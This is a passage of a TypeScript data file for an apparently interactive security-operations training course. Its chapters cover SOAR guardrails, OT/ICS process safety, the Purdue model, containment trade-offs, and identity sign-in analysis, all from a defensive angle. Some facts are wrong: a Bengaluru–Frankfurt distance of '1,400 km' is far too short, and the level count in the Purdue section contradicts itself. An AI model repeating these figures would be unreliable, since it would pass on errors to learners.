            'XDR fuses native telemetry streams across endpoints, cloud workloads, email gateways, and networks, correlating disparate events using machine learning models and deterministic graph schemas.',
          techBoxWhy:
            'Saves analyst hours during cross-vector triage while maintaining the critical understanding that vendor automation is an assistant, not an infallibility shield.',
          defaultAnimation: 'm10-xdr-cross-domain' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'xdr-env-truth', label: '1. VERIFIED ENVIRONMENT' },
            { id: 'xdr-cross-telemetry', label: '2. SENSOR CORRELATION' },
            { id: 'xdr-blind-spot-reality', label: '3. SENSOR GAP REALITY' },
            { id: 'xdr-marketing-myth', label: '4. HYPE VS TRUTH' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: GOVERNANCE & AUDIT',
          subPillar: 'CONTEMPORANEOUS CASE CUSTODY',
          heading: 'Case Management & Contemporaneous Chain of Custody',
          paragraph1:
            'Karthik instructs: "If it is not written down in the case management system at the moment you observed it, legally and operationally it never happened. Memory fades; audit-stamped records endure."',
          paragraph2:
            'The apprentice inspects the 4-part case dossier: Case Ownership assignment, Contemporaneous Decision Log with UTC timestamps, SHA-256 evidence vault holding process dumps, and Karthik\'s official supervisory seal.',
          techBoxTitle: 'TECH BOX: Contemporaneous Documentation, Evidentiary Hash Integrity & Legal Chain of Custody [Details]',
          techBoxAnalogy:
            'Like evidence collection at a crime scene: bagging physical fibers with signed, tamper-evident seals and recording the exact minute they were transferred to the forensic lab.',
          techBoxDef:
            'Contemporaneous Case Custody mandates that investigative hypotheses, observed artifacts, and containment actions are logged in real time with cryptographic SHA-256 hashes and immutable audit timestamps.',
          techBoxWhy:
            'Essential for internal governance, regulatory compliance audits (e.g. CERT-In / ISO 27001), and courtroom admissibility if cyber incidents proceed to criminal prosecution.',
          defaultAnimation: 'm10-case-management-custody' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'custody-ownership', label: '1. CASE OWNERSHIP' },
            { id: 'custody-timestamp-log', label: '2. DECISION LOG (UTC)' },
            { id: 'custody-sha256-evidence', label: '3. SHA-256 VAULT' },
            { id: 'custody-supervisory-sign', label: '4. SUPERVISORY SEAL' },
          ],
        },
      ];
    }

    // Chapter 2: The coordinator, not the commander
    if (chId === 'M10-U1-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: SOAR PLAYBOOK LOOP',
          subPillar: 'COORDINATION & ENRICHMENT',
          heading: 'The SOAR Orchestration & Enrichment Loop',
          paragraph1:
            'Mentor Karthik explains the role of SOAR: "SOAR is an orchestrator, not an autonomous dictator. It eliminates mechanical toil by automating IP reputation queries, LDAP user lookups, and ticket updates so analysts can focus on cognitive reasoning."',
          paragraph2:
            'The automated playbook ingests alert triggers, fetches multi-source threat intelligence, gathers endpoint context, and pauses at a mandatory Human-In-The-Loop review gate before any containment action can proceed.',
          techBoxTitle: 'TECH BOX: Security Orchestration, Automation & Response (SOAR), Webhook APIs & Playbook Engines [Details]',
          techBoxAnalogy:
            'Like a surgical assistant who sterilizes tools, pulls patient records, and preps the operating room, but waits for the lead surgeon to make the incision.',
          techBoxDef:
            'SOAR integrates disparate security platforms via RESTful APIs and webhooks, executing deterministic workflows (playbooks) that automate repeatable triage tasks.',
          techBoxWhy:
            'Reduces Mean Time to Respond (MTTR) from 45 minutes to 3 minutes during routine enrichment while preventing runaway scripts from causing operational downtime.',
          defaultAnimation: 'm10-soar-orchestration-loop' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'soar-ingest-trigger', label: '1. INGEST & TRIGGER' },
            { id: 'soar-auto-enrichment', label: '2. AUTO-ENRICHMENT' },
            { id: 'soar-review-gate', label: '3. HUMAN REVIEW GATE' },
            { id: 'soar-execution-step', label: '4. CONTROLLED ACTION' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: GOVERNANCE BOUNDARY',
          subPillar: 'CAPABILITY VS AUTHORITY',
          heading: 'Technical Capability vs Operational Authority',
          paragraph1:
            'Karthik asks a crucial governance question: "Just because your API key possesses the administrative permissions to terminate an enterprise database server, does that give you the operational authority to press the button?"',
          paragraph2:
            'An apprentice must distinguish between raw API access (the physical or programmatic power to issue commands) and operational authorization (written policy, peer review, change windows, and supervisory authorization).',
          techBoxTitle: 'TECH BOX: Operational Authority Matrix, Principle of Dual Authorization & API Token Governance [Details]',
          techBoxAnalogy:
            'Having the keys to the nuclear silo does not mean you have the presidential authorization code to launch.',
          techBoxDef:
            'Technical Capability defines the maximum scope of actions permitted by software credentials; Operational Authority defines the legally and procedurally permitted actions authorized for an employee\'s role.',
          techBoxWhy:
            'Prevents junior analysts or rogue API scripts from causing catastrophic business outages under the mistaken belief that having administrative access equals permission to execute.',
          defaultAnimation: 'm10-capability-vs-authority' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'cap-api-capability', label: '1. API CAPABILITY' },
            { id: 'cap-operational-auth', label: '2. OPERATIONAL AUTHORITY' },
            { id: 'cap-human-signoff', label: '3. DUAL SIGN-OFF' },
            { id: 'cap-rogue-disaster', label: '4. DISASTER WARNING' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: SAFEGUARD DOCTRINE',
          subPillar: 'AUTOMATION GUARDRAILS',
          heading: 'Safe Automation Guardrails: Exclusions & Circuit Breakers',
          paragraph1:
            'Karthik emphasizes defensive engineering for automation: "Unrestricted automation without guardrails is a self-inflicted denial-of-service attack waiting to happen. What if an automated playbook tries to isolate the Active Directory domain controller?"',
          paragraph2:
            'The apprentice inspects three essential guardrails: Critical Asset Exclusion lists (safeguarding domain controllers and payment gateways), Circuit Breaker rate limiters (stopping cascades if >5 hosts trigger within 60s), and graceful API timeout rollbacks.',
          techBoxTitle: 'TECH BOX: Automation Circuit Breakers, Critical Exclusion Blocklists & Fail-Safe Architecture [Details]',
          techBoxAnalogy:
            'Like the emergency electrical breaker in a manufacturing plant that trips instantly if power surges exceed safe tolerances, protecting expensive machinery from frying.',
          techBoxDef:
            'Automation Guardrails are deterministic programmatic controls (blocklists, rate limiters, fallback timeouts) that constrain SOAR playbooks from exceeding operational safety parameters.',
          techBoxWhy:
            'Protects core enterprise infrastructure from accidental self-containment and prevents false-positive alert floods from halting business operations.',
          defaultAnimation: 'm10-safe-automation-guardrails' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'guard-blocklist', label: '1. CRITICAL EXCLUSIONS' },
            { id: 'guard-circuit-breaker', label: '2. CIRCUIT BREAKER' },
            { id: 'guard-api-rollback', label: '3. API FALLBACK' },
            { id: 'guard-safe-verdict', label: '4. SAFEGUARDED SYSTEM' },
          ],
        },
      ];
    }

    // Chapter 3: A system that moves something physical
    if (chId === 'M10-U2-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: IT VS OT COMPARISON',
          subPillar: 'KINETIC SAFETY PRIORITY',
          heading: 'Industrial OT vs Enterprise IT: Kinetic Safety Priority',
          paragraph1:
            'Mentor Karthik introduces Lead Plant Operator Sunil to the SOC: "In enterprise IT, confidentiality of financial records and customer data comes first. In industrial OT, human safety and physical kinetic continuity reign supreme."',
          paragraph2:
            'Sunil shows the apprentice that in an industrial facility, cybersecurity is measured not in lost megabytes, but in boiling chemical temperatures, water supply pressure, and human life. A security control that causes a motor to stall is unacceptable.',
          techBoxTitle: 'TECH BOX: Operational Technology (OT), Industrial Control Systems (ICS) & Safety Interlocks [Details]',
          techBoxAnalogy:
            'Enterprise IT is like an accounting office where you can lock the front door during a suspicious event; Industrial OT is like a commercial airliner at 30,000 feet where you cannot shut down the engines just because a sensor flagged an anomaly.',
          techBoxDef:
            'OT comprises hardware and software that detects or causes changes in physical processes through the direct monitoring and control of physical devices such as valves, pumps, and motors.',
          techBoxWhy:
            'Analyst triage must account for physical kinetic consequences before recommending or executing containment commands in industrial environments.',
          defaultAnimation: 'm10-ot-vs-it-fundamentals' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'otit-it-priority', label: '1. IT: DATA CONFIDENTIALITY' },
            { id: 'otit-ot-priority', label: '2. OT: PHYSICAL SAFETY' },
            { id: 'otit-human-life', label: '3. OPERATOR SUNIL & LIFE' },
            { id: 'otit-availability', label: '4. HIGH AVAILABILITY' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: CLOSED-LOOP CONTROL',
          subPillar: 'ICS PHYSICAL LOOP',
          heading: 'ICS Physical Closed-Loop Control Architecture',
          paragraph1:
            'Sunil walks the apprentice along the plant cooling water loop: "A physical process is controlled by a continuous feedback loop: sensors read physical variables, controllers compute logic, and actuators adjust physical equipment."',
          paragraph2:
            'The apprentice inspects the plant loop: the water pipe sensor monitors pressure (82 PSI), feeds analog signals into PLC-02, which executes ladder logic, commanding the spinning cooling water pump (1,750 RPM) and alerting operator Sunil\'s HMI console.',
          techBoxTitle: 'TECH BOX: Programmable Logic Controllers (PLCs), Actuators, Sensors & Ladder Logic [Details]',
          techBoxAnalogy:
            'Like a household thermostat: the temperature sensor reads room heat, the thermostat logic evaluates against your setpoint, and the HVAC compressor kicks on to maintain equilibrium.',
          techBoxDef:
            'Closed-Loop ICS Control continuously samples physical sensor inputs, compares them against setpoint parameters using deterministic ladder logic in PLCs, and drives physical actuators without human latency.',
          techBoxWhy:
            'Understanding the components of a control loop enables analysts to distinguish between benign mechanical sensor calibration and deliberate cyber-physical manipulation.',
          defaultAnimation: 'm10-ics-components-loop' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'ics-pressure-sensor', label: '1. SENSOR (82 PSI)' },
            { id: 'ics-plc-logic', label: '2. PLC-02 CONTROLLER' },
            { id: 'ics-pump-actuator', label: '3. ACTUATOR (PUMP)' },
            { id: 'ics-hmi-console', label: '4. OPERATOR HMI' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: PROCESS SAFETY',
          subPillar: 'PERIL OF IT REBOOT',
          heading: 'Physical Process Safety vs Dangerous IT Reboots',
          paragraph1:
            'Karthik issues a stern warning: "The standard IT response to suspicious behavior—\'just reboot the server or terminate the process\'—can trigger a catastrophic physical failure in an industrial plant."',
          paragraph2:
            'If an overzealous IT analyst reboots PLC-02, pneumatic valves slam shut instantly, generating a destructive water hammer pressure spike (165 PSI) that fractures piping. Plant operator Sunil demonstrates the safe alternative: an engineered physical bypass valve.',
          techBoxTitle: 'TECH BOX: Industrial Water Hammer, Fail-Safe States & Physical Bypass Operations [Details]',
          techBoxAnalogy:
            'Slamming on the brakes of a speeding freight train: sudden deceleration can derail the cars, whereas coordinated braking along a safety siding stops the train safely.',
          techBoxDef:
            'Water Hammer occurs when a fluid in motion is forced to stop suddenly by rapid valve closure or sudden pump de-energization, creating destructive kinetic shockwaves throughout industrial piping.',
          techBoxWhy:
            'Instills absolute SOC discipline: IT response tactics must never be executed on OT controllers without physical plant engineering coordination and mechanical bypass readiness.',
          defaultAnimation: 'm10-reboot-peril-safety' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'peril-it-reboot', label: '1. IT REBOOT TRAP' },
            { id: 'peril-water-hammer', label: '2. WATER HAMMER SPIKE' },
            { id: 'peril-catastrophic-failure', label: '3. PIPE FRACTURE' },
            { id: 'peril-specialist-bypass', label: '4. ENGINEERED BYPASS' },
          ],
        },
      ];
    }

    // Chapter 4: Boundaries protect people and processes
    if (chId === 'M10-U2-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: PURDUE MODEL ARCHITECTURE',
          subPillar: 'LEVELS 0 THROUGH 5',
          heading: 'The Purdue Enterprise Reference Architecture (Levels 0-5)',
          paragraph1:
            'Senior Architect Karthik draws the Purdue Model on the whiteboard: "The Purdue Model is the defensive blueprint of industrial cybersecurity. It establishes strict hierarchical zones to ensure enterprise IT threats cannot bleed into kinetic control."',
          paragraph2:
            'The apprentice explores all 5 levels: Enterprise IT (Levels 4 & 5), Industrial Demilitarized Zone (Level 3.5 IDMZ), Supervisory Control Room & HMIs (Level 2), Deterministic PLCs (Level 1), and Physical Pumps & Sensors (Level 0).',
          techBoxTitle: 'TECH BOX: Purdue Enterprise Reference Architecture (ISA-95 / IEC 62443) [Details]',
          techBoxAnalogy:
            'Like medieval castle fortifications: the outer market (Enterprise), a guarded moat and portcullis (IDMZ), inner garrison barracks (Supervisory), and the central keep where the crown jewels reside (Field Devices).',
          techBoxDef:
            'The Purdue Model structures industrial architectures into segmented levels (0 to 5) with strict boundary filtering, ensuring control protocols and enterprise applications operate in isolated trust zones.',
          techBoxWhy:
            'Provides standard spatial terminology for incident triage: an alert in Level 4 requires different protocols than an alert originating in Level 1 or 2.',
          defaultAnimation: 'm10-purdue-model-layers' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'purdue-l4-enterprise', label: '1. LEVEL 4/5 ENTERPRISE' },
            { id: 'purdue-l35-idmz', label: '2. LEVEL 3.5 IDMZ' },
            { id: 'purdue-l2-supervisory', label: '3. LEVEL 2 SUPERVISORY' },
            { id: 'purdue-l10-physical', label: '4. LEVEL 1/0 FIELD' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: BOUNDARY SEGMENTATION',
          subPillar: 'IDMZ & HISTORIAN MIRROR',
          heading: 'Industrial DMZ & Data Historian Outward Mirroring',
          paragraph1:
            'Karthik asks: "Corporate finance needs real-time factory output numbers, but plant operators cannot permit IT connections into the plant network. How do we solve this?"',
          paragraph2:
            'The solution is the Industrial DMZ (Level 3.5). Plant historians push telemetry outward to a mirrored database in the IDMZ through dual firewalls. Corporate systems query the mirror. Direct inbound connections are blocked by a red laser barrier.',
          techBoxTitle: 'TECH BOX: Industrial Demilitarized Zone (IDMZ), Data Historians & Unidirectional Replication [Details]',
          techBoxAnalogy:
            'Like a secure embassy drop-box: diplomatic staff drop dispatches into a double-locked vestibule where couriers pick them up without anyone entering the embassy interior.',
          techBoxDef:
            'An IDMZ employs two firewalls from different vendors and mirrored data servers to prevent direct IP routing between enterprise networks and plant control networks while permitting essential business reporting.',
          techBoxWhy:
            'Eliminates common pivot vectors from corporate phishing compromises into industrial turbine and pump controllers.',
          defaultAnimation: 'm10-segmentation-dmz-boundary' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'seg-corporate-access', label: '1. CORPORATE REPORTING' },
            { id: 'seg-industrial-dmz-firewall', label: '2. DUAL FIREWALL IDMZ' },
            { id: 'seg-mirrored-historian', label: '3. MIRRORED HISTORIAN' },
            { id: 'seg-unapproved-path', label: '4. BLOCKED ROGUE ROUTE' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: OBSERVABILITY RESTRICTION',
          subPillar: 'PASSIVE MONITORING DOCTRINE',
          heading: 'Passive Optical Hardware TAPs vs Destructive Active Scans',
          paragraph1:
            'Karthik explains a core doctrine of industrial monitoring: "In enterprise IT, vulnerability scanners probe open ports aggressively. In industrial OT, active port scanning can crash legacy PLC IP stacks and shut down a refinery."',
          paragraph2:
            'The apprentice inspects approved passive observability: optical hardware network TAPs split light beams with zero packet injection. An active Nmap port scan is tested in the simulator—instantly overwhelming PLC-02\'s fragile TCP buffer and triggering a crash.',
          techBoxTitle: 'TECH BOX: Passive Optical Network TAPs, SPAN Ports & Fragile Industrial IP Stacks [Details]',
          techBoxAnalogy:
            'Passive monitoring is like using an external microphone to listen to engine vibrations; active scanning is like throwing a wrench into the rotating gears to see if they bounce.',
          techBoxDef:
            'Passive Optical TAPs physically split fiber-optic or copper signals at Layer 1, delivering 100% duplicate network traffic to security sensors without the ability to transmit packets back into the monitored stream.',
          techBoxWhy:
            'Prevents SOC monitoring tools from inadvertently causing physical industrial crashes while maintaining complete wire-level visibility.',
          defaultAnimation: 'm10-passive-monitoring-doctrine' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'pas-optical-tap', label: '1. PASSIVE OPTICAL TAP' },
            { id: 'pas-zero-packet-injection', label: '2. ZERO PACKET INJECTION' },
            { id: 'pas-active-scan-trap', label: '3. ACTIVE SCAN DANGER' },
            { id: 'pas-plc-crash', label: '4. FRAGILE PLC CRASH' },
          ],
        },
      ];
    }

    // Chapter 5: Response is a business decision too
    if (chId === 'M10-U3-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: THREE RESPONSE LEVERS',
          subPillar: 'BENEFIT VS COLLATERAL',
          heading: 'The Three Core Response Levers: Target, Benefit, Side Effects',
          paragraph1:
            'Mentor Karthik reviews the foundational response levers with the apprentice: "Every response action in security is a calculated trade-off. We have three primary levers: block external IP, disable user account, or isolate endpoint device."',
          paragraph2:
            'The apprentice examines the response matrix: each action is evaluated across 4 facets—Target Entity, Security Benefit, Unintended Business Side Effect, and Required Authorization Level.',
          techBoxTitle: 'TECH BOX: Containment Action Taxonomies, Incident Levers & Operational Matrix [Details]',
          techBoxAnalogy:
            'Like a physician prescribing potent medication: the drug destroys bacteria (benefit), but causes nausea and requires patient consent and dosage limits (side effects and governance).',
          techBoxDef:
            'Containment Lever Matrix categorizes active defensive responses by entity type, operational disruption score, and governance sign-off criteria.',
          techBoxWhy:
            'Ensures analysts consider the collateral impact on ongoing business operations before clicking containment triggers.',
          defaultAnimation: 'm10-three-response-actions' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'resp-block-ip', label: '1. BLOCK IP' },
            { id: 'resp-disable-account', label: '2. DISABLE ACCOUNT' },
            { id: 'resp-isolate-device', label: '3. ISOLATE DEVICE' },
            { id: 'resp-matrix-evaluation', label: '4. 4-FACET MATRIX' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: BUSINESS IMPACT ANALYSIS',
          subPillar: 'COLLATERAL DAMAGE RISK',
          heading: 'Unintended Side Effects & Critical Business Impact',
          paragraph1:
            'Karthik walks through real-world operational catastrophes: "What happens if an apprentice analyst sees malicious traffic from an IP address and blocks it immediately at the firewall?"',
          paragraph2:
            'If the IP belongs to a shared Cloudflare or AWS edge gateway, blocking it cuts off thousands of legitimate customer checkout sessions. Disabling an automated service account freezes company payroll. Isolating an unrecognized asset disrupts critical industrial automation.',
          techBoxTitle: 'TECH BOX: Shared Infrastructure Collateral Damage, Blast Radius Analysis & Service Accounts [Details]',
          techBoxAnalogy:
            'Shutting off the municipal water main to fix a single dripping faucet in apartment 3B, leaving the entire city without drinking water.',
          techBoxDef:
            'Blast Radius Assessment analyzes the direct dependencies, shared hosting infrastructure, and upstream business functions reliant on an entity targeted for containment.',
          techBoxWhy:
            'Prevents self-inflicted commercial outages that cost millions of dollars more than the original security event.',
          defaultAnimation: 'm10-side-effects-business-impact' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'side-shared-ip', label: '1. SHARED CDN IP COLLATERAL' },
            { id: 'side-service-account', label: '2. SERVICE ACCOUNT FREEZE' },
            { id: 'side-industrial-device', label: '3. INDUSTRIAL ASSET RISK' },
            { id: 'side-blast-radius', label: '4. BLAST RADIUS EVALUATION' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: REVERSIBILITY ANALYSIS',
          subPillar: 'THE REVERSIBILITY FALLACY',
          heading: 'The Reversibility Fallacy vs Measured Human Judgment',
          paragraph1:
            'Karthik challenges a common rookie misconception: "Analysts often say: \'We can just isolate it now and reconnect it in five minutes if it was a mistake—it is reversible!\' This is the Reversibility Fallacy."',
          paragraph2:
            'The apprentice studies the true cost: a temporary interruption of an automated payment pipeline drops transactions, breaches SLA contracts, and incurs severe financial penalties that cannot be reversed. True security requires measured human judgment.',
          techBoxTitle: 'TECH BOX: The Reversibility Fallacy, SLA Financial Penalties & Forensic Restraint [Details]',
          techBoxAnalogy:
            'Pulling the emergency brake on a high-speed roller coaster: you can release the brake afterwards, but passengers experienced trauma and the ride schedule is derailed for hours.',
          techBoxDef:
            'The Reversibility Fallacy is the mistaken assumption that technical containment actions have zero residual cost simply because the software command can be undone.',
          techBoxWhy:
            'Teaches analysts that downtime is a business loss. Containment decisions must balance containment speed against real-world operational disruption.',
          defaultAnimation: 'm10-reversibility-vs-judgment' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'rev-interruption-cost', label: '1. REAL INTERRUPTION COST' },
            { id: 'rev-reversibility-fallacy', label: '2. REVERSIBILITY FALLACY' },
            { id: 'rev-measured-judgment', label: '3. MEASURED JUDGMENT' },
            { id: 'rev-sla-penalty', label: '4. SLA PENALTY METRICS' },
          ],
        },
      ];
    }

    // Chapter 6: Knowing when to stop
    if (chId === 'M10-U3-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: BOUNDARY RESTRAINT',
          subPillar: 'READ-ONLY SAFETY LOCKOUT',
          heading: 'Encountering OT Assets: Read-Only Safety Barrier',
          paragraph1:
            'Mentor Karthik presents a simulated operational scenario: "You are investigating an alert on an unfamiliar asset identifier: BLR-PLANT-PLC-02. What do you do?"',
          paragraph2:
            'The apprentice analyst applies the Read-Only Safety Barrier. Recognizing that this asset is an industrial controller, the console\'s active containment levers are locked 🔒. The analyst gathers read-only packet logs without issuing a single write or reset command.',
          techBoxTitle: 'TECH BOX: The Read-Only Safety Barrier, ICS Asset Classification & Containment Lockout [Details]',
          techBoxAnalogy:
            'Entering a radioactive cleanroom: you can observe through the lead-glass window and record radiation levels, but you do not turn valves or flip switches inside.',
          techBoxDef:
            'Read-Only Restraint Doctrine mandates that upon encountering unconfirmed or industrial assets, analysts immediately halt active probing or modification, switching strictly to passive data collection.',
          techBoxWhy:
            'Protects physical machinery and human plant workers from catastrophic failure caused by unauthorized IT troubleshooting.',
          defaultAnimation: 'm10-read-only-boundary' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'ro-alert-trigger', label: '1. ASSET: BLR-PLANT-PLC-02' },
            { id: 'ro-containment-lockout', label: '2. READ-ONLY LOCKOUT 🔒' },
            { id: 'ro-passive-logs', label: '3. PASSIVE PCAP LOGS' },
            { id: 'ro-safety-preserved', label: '4. PROCESS INTEGRITY' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: FORENSIC DISCIPLINE',
          subPillar: 'ANTI-MANUFACTURED CORRELATION',
          heading: 'Disciplined Restraint: Anti-Manufactured Correlation',
          paragraph1:
            'Karthik teaches forensic honesty: "Under stress, analysts often manufacture false connections between completely unrelated events to feel like they are solving a bigger mystery."',
          paragraph2:
            'The apprentice verifies the clean forensic boundary: Finance Case #2026-881 (compromised workstation in Bengaluru) has ZERO connection to the separate plant cooling pump simulation. A professional analyst documents facts, not fabricated drama.',
          techBoxTitle: 'TECH BOX: Confirmation Bias, Anti-Manufactured Correlation & Evidentiary Discipline [Details]',
          techBoxAnalogy:
            'A medical doctor diagnosing pneumonia who refuses to blame the patient\'s sprained ankle on the lung infection just because both symptoms occurred on the same afternoon.',
          techBoxDef:
            'Anti-Manufactured Correlation is the rigorous forensic practice of separating coincidental anomalies that lack verifiable causal evidence or common network artifacts.',
          techBoxWhy:
            'Prevents wasted investigative hours, wild goose chases, and misleading incident reports submitted to executive leadership.',
          defaultAnimation: 'm10-anti-manufactured-link' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'anti-case-881-facts', label: '1. CASE #2026-881 FACTS' },
            { id: 'anti-plant-facts', label: '2. SEPARATE PLANT LAB' },
            { id: 'anti-zero-link', label: '3. CLEAN SEPARATION ✂️' },
            { id: 'anti-forensic-integrity', label: '4. FORENSIC INTEGRITY' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: SPECIALIST ESCALATION',
          subPillar: 'OT DOSSIER & SUPERVISORY SEAL',
          heading: 'OT Specialist Escalation Dossier & Supervisory Seal',
          paragraph1:
            'Karthik concludes the module: "When you reach the boundary of your domain knowledge, the most professional action is knowing when to stop and escalating with clarity."',
          paragraph2:
            'The apprentice builds the OT escalation dossier: asset identifier manifest, precise observation window, explicit statement of uncertainty, and clean routing to Lead Plant Operator Sunil. Karthik inspects the dossier and applies the official CDAC supervisory seal.',
          techBoxTitle: 'TECH BOX: Specialized OT Escalation Protocols, Handover Dossiers & CDAC Supervisory Sign-Off [Details]',
          techBoxAnalogy:
            'A paramedic stabilizing a patient at the scene and providing a precise handover summary to the chief trauma surgeon upon arrival at the hospital.',
          techBoxDef:
            'Specialist Escalation Protocol routes technical telemetry to designated domain experts with an explicit record of observed facts, eliminating guesswork and unauthorized containment actions.',
          techBoxWhy:
            'Ensures enterprise SOC and plant operations communicate seamlessly, preserving plant safety and completing incident governance standards.',
          defaultAnimation: 'm10-ot-specialist-escalation' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'esc-asset-manifest', label: '1. ASSET IDENTIFIER' },
            { id: 'esc-honest-uncertainty', label: '2. HONEST UNCERTAINTY' },
            { id: 'esc-specialist-routing', label: '3. OPERATOR SUNIL ROUTE' },
            { id: 'esc-karthik-seal', label: '4. SUPERVISORY SEAL ✓' },
          ],
        },
      ];
    }

    // =========================================================================
    // MODULE 11: IDENTITY, EMAIL & THREAT INTELLIGENCE
    // =========================================================================

    // Chapter 1: The account has its own trail
    if (chId === 'M11-U1-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: SIGN-IN TELEMETRY',
          subPillar: 'ACCOUNT PRINCIPAL & CONTEXT',
          heading: 'The Account Principal Has Its Own Trail',
          paragraph1:
            'Mentor Meera introduces identity monitoring: "When investigating an alert, remember: the account has its own trail. An account identifier like FIN-OPS-01 represents an identity claim in the cloud directory, not absolute proof of who is sitting at the keyboard."',
          paragraph2:
            'The apprentice inspects the four core sign-in telemetry facets: the account principal UPN, the target enterprise resource (Microsoft 365 or ERP), the managed client device posture (BLR-BR-WS-04, Intune compliant), and the cryptographically signed authentication event code.',
          techBoxTitle: 'TECH BOX: Identity Provider Telemetry, OAuth Tokens & AAD STS Event Codes [Details]',
          techBoxAnalogy:
            'Like a company photo ID badge: swiping it at the lobby door logs the badge number and timestamp, but security cameras must verify who was actually wearing the badge.',
          techBoxDef:
            'Identity Telemetry encompasses authentication logs generated by Identity Providers (IdP) containing client user-agents, IP addresses, conditional access policy evaluations, and OAuth token grants.',
          techBoxWhy:
            'Enables analysts to detect compromised credentials when attackers log in from foreign unmanaged browsers using valid user passwords.',
          defaultAnimation: 'm11-signin-telemetry-stream' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'sign-account-id', label: '1. ACCOUNT CLAIM' },
            { id: 'sign-app-service', label: '2. TARGET APP' },
            { id: 'sign-device-posture', label: '3. DEVICE POSTURE' },
            { id: 'sign-auth-result', label: '4. EVENT 4624 / AAD' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: FACTOR DISSECTION',
          subPillar: 'MFA TRUST FALLACY',
          heading: 'MFA Factor Evaluation vs The "Successful MFA Trust Fallacy"',
          paragraph1:
            'Meera addresses a widespread misconception: "Analysts often see a successful MFA prompt on a login log and immediately close the ticket as benign. This is the Successful MFA Trust Fallacy."',
          paragraph2:
            'Strong controls add friction, but they do not make every session trustworthy. Adversaries bypass MFA via Adversary-in-the-Middle (AiTM) reverse proxies that steal authenticated ESTSAUTH session cookies or launch 2:00 AM prompt-bombing fatigue attacks.',
          techBoxTitle: 'TECH BOX: Multi-Factor Authentication (MFA), AiTM Phishing Proxies & Session Cookies [Details]',
          techBoxAnalogy:
            'Like an armored front door with dual deadbolts: having the keys doesn\'t help if an intruder sneaks in through the delivery window or picks the owner\'s pocket after they unlock it.',
          techBoxDef:
            'AiTM Phishing deploys reverse proxy servers between the victim and legitimate IdP to siphon session cookies during the login handshake, allowing attackers to replay the session without ever cracking the MFA factor.',
          techBoxWhy:
            'Instructs L1 analysts to inspect post-authentication behavior (e.g. sudden mailbox rule creation or mass file exports) even after an MFA challenge passes.',
          defaultAnimation: 'm11-mfa-trust-fallacy' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'mfa-factor-eval', label: '1. MFA FACTOR CLAIM' },
            { id: 'mfa-session-theft', label: '2. AiTM TOKEN THEFT' },
            { id: 'mfa-fatigue-attack', label: '3. PROMPT BOMBING' },
            { id: 'mfa-meera-doctrine', label: '4. MEERA DOCTRINE' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: GEOLOCATION REALITY',
          subPillar: 'IMPOSSIBLE TRAVEL FALLACY',
          heading: 'IP Geolocation Reality vs The "Impossible Travel Fallacy"',
          paragraph1:
            'Meera examines a Sev-1 Impossible Travel alert: "The dashboard flags that FIN-OPS-01 logged in from Bengaluru at 09:14 AM and from Frankfurt at 09:20 AM. A 1,400 km leap in 6 minutes looks impossible. Does that prove a breach?"',
          paragraph2:
            '"No," Meera explains. "IP geolocation is an approximation based on commercial ISP allocations, not physical GPS coordinates. Legitimate corporate VPNs and cloud security proxies frequently cause users to egress from data centers thousands of kilometers away."',
          techBoxTitle: 'TECH BOX: Geolocation Databases (MaxMind), Autonomous Systems (ASNs) & Egress VPNs [Details]',
          techBoxAnalogy:
            'Receiving an email with a London postmark simply because the sender mailed it through a corporate international mail sorting facility while traveling.',
          techBoxDef:
            'Impossible Travel Alarms calculate speed-over-distance between consecutive authentications. However, centralized enterprise egress tunnels (e.g. Zscaler) trigger false positives by redirecting branch traffic through foreign cloud nodes.',
          techBoxWhy:
            'Prevents junior analysts from panicking and locking user accounts based solely on inaccurate city pins on a dashboard map.',
          defaultAnimation: 'm11-impossible-travel-reality' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'geo-ip-label', label: '1. GEOIP ESTIMATION' },
            { id: 'geo-vpn-proxy', label: '2. CORPORATE VPN EGRESS' },
            { id: 'geo-velocity-math', label: '3. VELOCITY MATH' },
            { id: 'geo-meera-verdict', label: '4. RESTRAINT RULE' },
          ],
        },
      ];
    }

    // Chapter 2: Access changes the stakes
    if (chId === 'M11-U1-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: ROLE PRIVILEGE',
          subPillar: 'BLAST RADIUS COMPARISON',
